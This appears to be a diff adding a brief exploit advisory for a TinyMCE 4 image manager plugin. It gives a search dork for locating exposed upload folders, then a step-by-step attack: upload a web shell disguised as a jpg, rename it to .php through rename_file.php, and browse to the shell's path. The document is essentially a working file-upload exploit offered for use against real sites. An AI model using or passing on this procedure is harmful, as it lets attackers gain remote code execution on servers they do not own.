@@ -1,0 +1,13 @@
+Tinymce4 Image Manager
+Author: Typical Idiot Security
+Dork: inurl:/plugins/image/uploads/
+
+file affected: /plugins/image/image.php & rename_file.php
+
+first upload your jpg shell
+http://localhost.com/tinymce/plugins/image/image.php
+then. change name with
+http://localhost.com/tinymce/plugins/image/rename_file.php?current_name=shell.jpg&new_name=shell.php
+
+path shell:
+http://localhost.com/tinymce/plugins/image/uploads/shell.php
